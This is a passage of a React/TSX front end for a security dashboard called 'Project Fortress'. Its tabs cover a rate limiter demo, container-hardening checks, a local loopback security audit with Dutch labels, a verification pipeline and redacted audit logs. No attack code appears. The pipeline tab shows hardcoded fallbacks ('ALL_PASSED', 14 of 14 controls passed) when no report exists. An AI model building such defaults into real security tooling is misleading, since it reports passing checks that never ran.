                    <option value="execute:remediation">execute:remediation</option>
                    <option value="rotate:keys">rotate:keys</option>
                    <option value="simulate:attack">simulate:attack</option>
                  </select>
                  <button
                    onClick={handleTestCapability}
                    className="px-3 py-1 bg-teal-600 hover:bg-teal-500 text-white text-xs rounded font-medium cursor-pointer"
                  >
                    Assert Capability
                  </button>
                  {capabilityResult && (
                    <span className={`text-xs font-mono font-bold ${capabilityResult.startsWith('GRANTED') ? 'text-emerald-400' : 'text-rose-400'}`}>
                      {capabilityResult}
                    </span>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* --- TAB 4: RATE LIMITER --- */}
        {activeTab === 'RATE_LIMIT' && (
          <div className="space-y-6">
            <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div>
                <h2 className="text-base font-semibold text-white flex items-center gap-2">
                  <Cpu className="h-5 w-5 text-emerald-400" />
                  Token Bucket Rate Limiter & Resource Governor
                </h2>
                <p className="text-xs text-slate-400 mt-1">
                  Protects internal API workers against volumetric traffic surges, credential stuffing, and algorithmic ReDoS exhaustion.
                </p>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 text-center">
                  <div className="text-2xl font-bold text-white">{rateStatus.remaining} / 10</div>
                  <div className="text-xs text-slate-400 font-mono uppercase mt-1">Available Bucket Tokens</div>
                </div>
                <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 text-center">
                  <div className="text-2xl font-bold text-teal-400">30s Window</div>
                  <div className="text-xs text-slate-400 font-mono uppercase mt-1">Replenishment Period</div>
                </div>
                <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 text-center">
                  <div className="text-2xl font-bold text-emerald-400">429 Fail-Closed</div>
                  <div className="text-xs text-slate-400 font-mono uppercase mt-1">Throttling Action</div>
                </div>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={handleFireRequest}
                  className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-semibold cursor-pointer flex items-center gap-2"
                >
                  <Play className="h-3.5 w-3.5" />
                  Fire Single Request (Consume 1 Token)
                </button>
                <button
                  onClick={handleBurstSpike}
                  className="px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-xs font-semibold cursor-pointer flex items-center gap-2"
                >
                  <AlertTriangle className="h-3.5 w-3.5" />
                  Simulate Volumetric Burst (12 Rapid Requests)
                </button>
              </div>

              {/* Request Audit History */}
              <div className="space-y-2">
                <span className="text-xs font-mono text-slate-400 block">RECENT TRAFFIC ATTEMPTS:</span>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl max-h-48 overflow-y-auto space-y-1">
                  {rateLimitLogs.length === 0 ? (
                    <div className="text-xs text-slate-500 font-mono">No requests fired yet. Click buttons above.</div>
                  ) : (
                    rateLimitLogs.map((log) => (
                      <div key={log.id} className="flex items-center justify-between text-xs font-mono py-1 border-b border-slate-900 last:border-0">
                        <span className="text-slate-400">[{log.time}] Req {log.id}</span>
                        <span className={`font-bold ${log.allowed ? 'text-emerald-400' : 'text-rose-400'}`}>
                          {log.allowed ? `ALLOWED (Remaining: ${log.remaining})` : 'HTTP 429 TOO MANY REQUESTS'}
                        </span>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* --- TAB 5: CONTAINER ISOLATION --- */}
        {activeTab === 'ISOLATION' && (
          <div className="space-y-6">
            <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-base font-semibold text-white flex items-center gap-2">
                    <Server className="h-5 w-5 text-emerald-400" />
                    CIS Docker & Kubernetes Restricted PSS Compliance Auditor
                  </h2>
                  <p className="text-xs text-slate-400 mt-1">
                    Verifies container security attributes: non-root execution, capability dropping, read-only rootfs, and seccomp filters.
                  </p>
                </div>
                <div className={`px-3 py-1.5 rounded-lg border text-xs font-mono font-bold ${
                  isolationAudit.isCompliant ? 'bg-emerald-950/60 border-emerald-800 text-emerald-400' : 'bg-rose-950/60 border-rose-800 text-rose-400'
                }`}>
                  COMPLIANCE SCORE: {isolationAudit.scorePercent}%
                </div>
              </div>

              {/* Interactive Profile Controls */}
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 p-4 rounded-xl bg-slate-950 border border-slate-800">
                <label className="flex items-center gap-2 text-xs font-mono text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={customProfile.runAsNonRoot && customProfile.uid === 10001}
                    onChange={(e) => {
                      const nonRoot = e.target.checked;
                      handleProfileChange('runAsNonRoot', nonRoot);
                      handleProfileChange('uid', nonRoot ? 10001 : 0);
                    }}
                    className="rounded text-emerald-500"
                  />
                  Non-Root Execution (UID 10001)
                </label>

                <label className="flex items-center gap-2 text-xs font-mono text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={customProfile.readOnlyRootFilesystem}
                    onChange={(e) => handleProfileChange('readOnlyRootFilesystem', e.target.checked)}
                    className="rounded text-emerald-500"
                  />
                  Read-Only Root Filesystem
                </label>

                <label className="flex items-center gap-2 text-xs font-mono text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={!customProfile.allowPrivilegeEscalation}
                    onChange={(e) => handleProfileChange('allowPrivilegeEscalation', !e.target.checked)}
                    className="rounded text-emerald-500"
                  />
                  No Privilege Escalation
                </label>

                <label className="flex items-center gap-2 text-xs font-mono text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={customProfile.dropCapabilities.includes('ALL')}
                    onChange={(e) => {
                      const dropped = e.target.checked ? ['ALL'] : [];
                      handleProfileChange('dropCapabilities', dropped);
                    }}
                    className="rounded text-emerald-500"
                  />
                  Drop All Linux Capabilities
                </label>

                <label className="flex items-center gap-2 text-xs font-mono text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={customProfile.seccompProfileType === 'CustomWhitelist'}
                    onChange={(e) => {
                      const type = e.target.checked ? 'CustomWhitelist' : 'RuntimeDefault';
                      handleProfileChange('seccompProfileType', type);
                    }}
                    className="rounded text-emerald-500"
                  />
                  Custom Seccomp Whitelist Filter
                </label>

                <label className="flex items-center gap-2 text-xs font-mono text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={customProfile.memoryLimitMb <= 512}
                    onChange={(e) => handleProfileChange('memoryLimitMb', e.target.checked ? 512 : 2048)}
                    className="rounded text-emerald-500"
                  />
                  cgroup Limit (512MB RAM / 1.0 CPU)
                </label>
              </div>

              {/* Granular Rules Checklist */}
              <div className="space-y-2">
                <span className="text-xs font-mono text-slate-400 block">STANDARD SECURITY CONTROLS:</span>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {isolationAudit.checks.map((chk, idx) => (
                    <div key={idx} className={`p-3 rounded-lg border text-xs font-mono flex items-start gap-2.5 ${
                      chk.passed ? 'bg-slate-950 border-emerald-900/40 text-slate-300' : 'bg-rose-950/20 border-rose-800 text-rose-300'
                    }`}>
                      {chk.passed ? (
                        <CheckCircle2 className="h-4 w-4 text-emerald-400 shrink-0 mt-0.5" />
                      ) : (
                        <XCircle className="h-4 w-4 text-rose-400 shrink-0 mt-0.5" />
                      )}
                      <div>
                        <div className="font-bold">{chk.rule} [{chk.severity}]</div>
                        <div className="text-[11px] text-slate-400 mt-0.5">{chk.recommendation}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* --- TAB 6: PIPELINE --- */}
        {activeTab === 'PIPELINE' && (
          <div className="space-y-6">
            <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div>
                  <h2 className="text-base font-semibold text-white flex items-center gap-2">
                    <CheckCircle2 className="h-5 w-5 text-emerald-400" />
                    Automated Verification Pipeline Results
                  </h2>
                  <p className="text-xs text-slate-400 mt-1">
                    Continuous automated security verification suite executing deterministic assertions across all subsystems.
                  </p>
                </div>
                <button
                  onClick={handleRunPipeline}
                  disabled={isVerifying}
                  className="flex items-center gap-1.5 px-4 py-2 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white rounded-lg text-xs font-semibold cursor-pointer"
                >
                  <RefreshCw className={`h-4 w-4 ${isVerifying ? 'animate-spin' : ''}`} />
                  {isVerifying ? 'Running Suite...' : 'Re-run Verification'}
                </button>
              </div>

              {/* Status Banner */}
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="h-10 w-10 rounded-lg bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center">
                    <ShieldCheck className="h-6 w-6 text-emerald-400" />
                  </div>
                  <div>
                    <div className="font-bold text-sm text-white">Status: {pipelineReport?.status || 'ALL_PASSED'}</div>
                    <div className="text-xs text-slate-400">
                      {pipelineReport?.passedChecks ?? 14} of {pipelineReport?.totalChecks ?? 14} controls passed in {pipelineReport?.durationMs ?? 29}ms
                    </div>
                  </div>
                </div>
                <div className="text-xs font-mono text-slate-500">
                  Last Executed: {pipelineReport ? new Date(pipelineReport.timestamp).toLocaleTimeString() : 'Initial'}
                </div>
              </div>

              {/* Granular Checks Table */}
              <div className="border border-slate-800 rounded-xl overflow-hidden">
                <table className="w-full text-left text-xs font-mono">
                  <thead className="bg-slate-950 border-b border-slate-800 text-slate-400">
                    <tr>
                      <th className="p-3">CONTROL ID</th>
                      <th className="p-3">CATEGORY</th>
                      <th className="p-3">SECURITY CHECK</th>
                      <th className="p-3">VERDICT</th>
                      <th className="p-3">TIME</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60 bg-slate-900/60">
                    {pipelineReport?.results.map((r) => (
                      <tr key={r.id} className="hover:bg-slate-800/30">
                        <td className="p-3 text-slate-300 font-bold">{r.id}</td>
                        <td className="p-3 text-slate-400">{r.category}</td>
                        <td className="p-3 text-slate-200">{r.name}</td>
                        <td className="p-3">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${r.status === 'PASS' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
                            {r.status}
                          </span>
                        </td>
                        <td className="p-3 text-slate-500">{r.executionTimeMs}ms</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* --- TAB: SECURITY AUDIT --- */}
        {activeTab === 'SECURITY_AUDIT' && (
          <div className="space-y-6">
            {/* Disclaimer & Scope Banner */}
            <div className="p-5 rounded-2xl bg-gradient-to-r from-amber-950/40 via-slate-900 to-slate-900 border border-amber-500/30 flex items-start gap-4 shadow-lg">
              <div className="p-2.5 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 shrink-0">
                <AlertTriangle className="h-6 w-6" />
              </div>
              <div className="space-y-1.5 flex-1">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-amber-300 bg-amber-500/20 px-2 py-0.5 rounded border border-amber-500/30">
                    SCOPED LOCAL VERIFICATION
                  </span>
                  <h2 className="text-base font-bold text-white tracking-wide">
                    Beperkte lokale audit, geen volledige penetratietest
                  </h2>
                </div>
                <p className="text-xs text-slate-300 leading-relaxed">
                  Deze modulaire Security Audit controleert geautomatiseerd en controleerbaar de concrete runtime-beveiliging van het systeem op <strong>127.0.0.1 (loopback)</strong>. De controle dekt de vijf verwachte HTTP-beveiligingsheaders, de statische bestanden-allowlist, weigering van niet-toegestane methoden (TRACE/TRACK), correcte 404-foutafhandeling zonder stack-trace-lekkage, en bescherming tegen blootstelling van interne broncode en omgevingsvariabelen. Controles die niet daadwerkelijk zijn uitgevoerd worden als <code>NOT_VERIFIED</code> gemarkeerd.
                </p>
              </div>
            </div>

            {/* Probe Controller & Target Configuration */}
            <div className="p-5 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                <div>
                  <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                    <ShieldCheck className="h-4 w-4 text-emerald-400" />
                    Security Audit Controller
                  </h3>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Target endpoint: <span className="font-mono text-emerald-300">{auditReport?.target || auditTargetUrl}</span> • Audit ID: <span className="font-mono text-slate-300">{auditReport?.auditId || 'Init'}</span>
                  </p>
                </div>

                <div className="flex items-center gap-2 w-full md:w-auto">
                  <div className="relative flex-1 md:w-64">
                    <input
                      type="text"
                      value={auditTargetUrl}
                      onChange={(e) => setAuditTargetUrl(e.target.value)}
                      placeholder="http://127.0.0.1:3000"
                      className="w-full px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-700 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                  <button
                    onClick={() => handleRunSecurityAudit()}
                    disabled={isAuditLoading}
                    className="px-4 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 text-slate-950 font-semibold text-xs flex items-center gap-2 transition cursor-pointer shrink-0"
                  >
                    <RefreshCw className={`h-3.5 w-3.5 ${isAuditLoading ? 'animate-spin' : ''}`} />
                    {isAuditLoading ? 'Audit Uitvoeren...' : 'Voer Audit Uit'}
                  </button>
                  {auditReport && (
                    <button
                      onClick={() => copyToClipboard(JSON.stringify(auditReport, null, 2), 'audit-json')}
                      className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono flex items-center gap-1.5 transition cursor-pointer shrink-0"
                    >
                      {copied === 'audit-json' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                      JSON
                    </button>
                  )}
                </div>
              </div>

              {auditError && (
                <div className="p-3 rounded-lg bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs font-mono">
                  {auditError}
                </div>
              )}
            </div>

            {/* Metrics Dashboard */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800">
                <span className="text-slate-400 text-xs uppercase font-mono">Totaal Controles</span>
                <div className="mt-1 text-2xl font-bold text-white font-mono">{auditReport?.summary.total ?? 0}</div>
                <div className="text-[11px] text-slate-500 mt-0.5">5 beveiligingsdomeinen</div>
              </div>

              <div className="p-4 rounded-xl bg-slate-900 border border-emerald-500/30 bg-emerald-950/10">
                <span className="text-emerald-400 text-xs uppercase font-mono">Geslaagd (PASS)</span>
                <div className="mt-1 text-2xl font-bold text-emerald-400 font-mono">{auditReport?.summary.passed ?? 0}</div>
                <div className="text-[11px] text-emerald-500/80 mt-0.5">Actieve defensieve handhaving</div>
              </div>

              <div className="p-4 rounded-xl bg-slate-900 border border-rose-500/30 bg-rose-950/10">
                <span className="text-rose-400 text-xs uppercase font-mono">Mislukt (FAIL)</span>
                <div className="mt-1 text-2xl font-bold text-rose-400 font-mono">{auditReport?.summary.failed ?? 0}</div>
                <div className="text-[11px] text-rose-400/80 mt-0.5">Beveiligingskwetsbaarheden</div>
              </div>

              <div className="p-4 rounded-xl bg-slate-900 border border-amber-500/30 bg-amber-950/10">
                <span className="text-amber-400 text-xs uppercase font-mono">Niet Geverifieerd</span>
                <div className="mt-1 text-2xl font-bold text-amber-400 font-mono">{auditReport?.summary.notVerified ?? 0}</div>
                <div className="text-[11px] text-amber-400/80 mt-0.5">Vereist TLS / specifieke context</div>
              </div>
            </div>

            {/* Severity Counters Bar */}
            <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-900/60 border border-slate-800 text-xs font-mono overflow-x-auto">
              <span className="text-slate-400 uppercase tracking-wider text-[11px]">Gedocumenteerde Ernst:</span>
              <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-400 border border-rose-500/30">
                HIGH: <strong>{auditReport?.summary.bySeverity.HIGH ?? 0}</strong>
              </span>
              <span className="px-2 py-0.5 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30">
                MEDIUM: <strong>{auditReport?.summary.bySeverity.MEDIUM ?? 0}</strong>
              </span>
              <span className="px-2 py-0.5 rounded bg-sky-500/20 text-sky-400 border border-sky-500/30">
                LOW: <strong>{auditReport?.summary.bySeverity.LOW ?? 0}</strong>
              </span>
              <span className="px-2 py-0.5 rounded bg-slate-700/40 text-slate-300 border border-slate-600/30">
                INFO: <strong>{auditReport?.summary.bySeverity.INFO ?? 0}</strong>
              </span>
            </div>

            {/* Filter and Search Bar */}
            <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
              <div className="flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
                <div className="relative flex-1">
                  <Search className="h-4 w-4 text-slate-500 absolute left-3 top-2.5" />
                  <input
                    type="text"
                    value={auditSearchQuery}
                    onChange={(e) => setAuditSearchQuery(e.target.value)}
                    placeholder="Zoek in controles, ID, omschrijving of bewijs..."
                    className="w-full pl-9 pr-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-emerald-500"
                  />
                </div>

                <div className="flex items-center gap-2 flex-wrap text-xs">
                  <span className="text-slate-400 font-mono text-[11px]">Status:</span>
                  {(['ALL', 'PASS', 'FAIL', 'NOT_VERIFIED'] as const).map((s) => (
                    <button
                      key={s}
                      onClick={() => setAuditStatusFilter(s)}
                      className={`px-2.5 py-1 rounded text-xs font-mono transition cursor-pointer ${
                        auditStatusFilter === s
                          ? 'bg-emerald-500 text-slate-950 font-bold'
                          : 'bg-slate-800 text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {s}
                    </button>
                  ))}
                </div>
              </div>

              <div className="flex items-center gap-2 flex-wrap text-xs pt-1 border-t border-slate-800/60">
                <span className="text-slate-400 font-mono text-[11px]">Ernstniveau:</span>
                {(['ALL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'] as const).map((sev) => (
                  <button
                    key={sev}
                    onClick={() => setAuditSeverityFilter(sev)}
                    className={`px-2 py-0.5 rounded text-[11px] font-mono transition cursor-pointer ${
                      auditSeverityFilter === sev
                        ? 'bg-cyan-500 text-slate-950 font-bold'
                        : 'bg-slate-800 text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {sev}
                  </button>
                ))}

                <span className="text-slate-500 ml-auto text-[11px] font-mono">
                  Getoond: {filteredAuditFindings.length} van {auditReport?.findings.length ?? 0}
                </span>
              </div>
            </div>

            {/* Findings Detailed Cards */}
            <div className="space-y-4">
              {filteredAuditFindings.length === 0 ? (
                <div className="p-8 rounded-xl bg-slate-900 border border-slate-800 text-center text-slate-400 text-xs font-mono">
                  Geen beveiligingscontroles gevonden die voldoen aan de filtercriteria.
                </div>
              ) : (
                filteredAuditFindings.map((finding) => (
                  <div
                    key={finding.id}
                    className="p-5 rounded-xl bg-slate-900 border border-slate-800 space-y-3.5 hover:border-slate-700 transition"
                  >
                    {/* Header Row */}
                    <div className="flex items-start justify-between gap-3 flex-wrap">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="px-2 py-0.5 rounded bg-slate-800 border border-slate-700 text-slate-300 font-mono text-xs font-bold">
                            {finding.id}
                          </span>
                          <span className="px-2 py-0.5 rounded bg-slate-800/60 text-slate-400 text-[10px] font-mono uppercase">
                            {finding.category.replace('_', ' ')}
                          </span>
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                              finding.severity === 'HIGH'
                                ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                                : finding.severity === 'MEDIUM'
                                ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                                : finding.severity === 'LOW'
                                ? 'bg-sky-500/20 text-sky-400 border border-sky-500/30'
                                : 'bg-slate-700/30 text-slate-400 border border-slate-600/30'
                            }`}
                          >
                            ERNST: {finding.severity}
                          </span>
                        </div>
                        <h4 className="text-sm font-semibold text-white tracking-wide">{finding.title}</h4>
                      </div>

                      <div className="flex items-center gap-2">
                        <span
                          className={`px-3 py-1 rounded-lg text-xs font-mono font-bold tracking-wider ${
                            finding.status === 'PASS'
                              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                              : finding.status === 'FAIL'
                              ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40'
                              : 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                          }`}
                        >
                          {finding.status}
                        </span>
                      </div>
                    </div>

                    {/* Description */}
                    <p className="text-xs text-slate-300 leading-relaxed">{finding.description}</p>

                    {/* Concrete Evidence Box */}
                    <div className="space-y-1">
                      <div className="flex items-center justify-between text-[11px] font-mono text-slate-400">
                        <span>CONCREET BEWIJS (EVIDENCE):</span>
                        <span className="text-slate-500">{finding.testedAt}</span>
                      </div>
                      <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs text-emerald-400/90 overflow-x-auto whitespace-pre-wrap break-all">
                        {finding.evidence}
                      </div>
                    </div>

                    {/* Remediation Advice Box */}
                    <div className="space-y-1">
                      <div className="text-[11px] font-mono text-cyan-400 font-semibold">
                        HERSTELADVIES (REMEDIATION):
                      </div>
                      <div className="p-3 rounded-lg bg-cyan-950/20 border border-cyan-800/30 text-xs text-cyan-200 font-mono leading-relaxed">
                        {finding.remediation}
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        )}

        {/* --- TAB 7: AUDIT LOGS --- */}
        {activeTab === 'AUDIT_LOGS' && (
          <div className="space-y-6">
            <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-base font-semibold text-white flex items-center gap-2">
                    <Terminal className="h-5 w-5 text-emerald-400" />
                    Structured Sanitized Audit Telemetry
                  </h2>
                  <p className="text-xs text-slate-400 mt-1">
                    Continuous ring-buffer log stream. Deterministic redaction ensures zero leakage of bearer tokens, passwords, or AWS keys.
                  </p>
                </div>
                <button
                  onClick={refreshAuditLogs}
                  className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-xs font-mono cursor-pointer flex items-center gap-1.5"
                >
                  <RefreshCw className="h-3.5 w-3.5" />
                  Refresh Logs
                </button>
              </div>

              {/* Log Feed */}
              <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2 max-h-96 overflow-y-auto font-mono text-xs">
                {auditLogs.length === 0 ? (
                  <div className="text-slate-500">No security events recorded. Perform actions to generate logs.</div>
                ) : (
                  auditLogs.map((ev) => (
                    <div key={ev.id} className="p-2.5 rounded bg-slate-900/80 border border-slate-800/80 space-y-1">
                      <div className="flex items-center justify-between text-[11px]">
                        <span className="text-slate-400">[{ev.timestamp}] <strong className="text-white">{ev.eventType}</strong></span>
                        <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
                          ev.severity === 'CRITICAL' ? 'bg-rose-500/20 text-rose-400' :
                          ev.severity === 'HIGH' ? 'bg-orange-500/20 text-orange-400' :
                          ev.severity === 'MEDIUM' ? 'bg-amber-500/20 text-amber-400' : 'bg-emerald-500/20 text-emerald-400'
                        }`}>
                          {ev.severity}
                        </span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Principal: <span className="text-slate-200">{ev.principal}</span> | Source IP: <span className="text-slate-200">{ev.sourceIp}</span>
                      </div>
                      <pre className="text-[10px] text-emerald-300 bg-slate-950 p-2 rounded overflow-x-auto">
                        {JSON.stringify(ev.details, null, 2)}
                      </pre>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800 bg-slate-950 px-6 py-4 text-center text-xs text-slate-500 font-mono">
        PROJECT FORTRESS — Language-Independent Cybersecurity Infrastructure & Runtime Risk Reduction • Sovereign Architecture Compliance
      </footer>
    </div>
  );
}

function LayersIcon(props: React.SVGProps<SVGSVGElement>) {
  return (
    <svg {...props} fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M12 2L2 7l10 5 10-5-10-5z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M2 17l10 5 10-5M2 12l10 5 10-5" />
    </svg>
  );
}
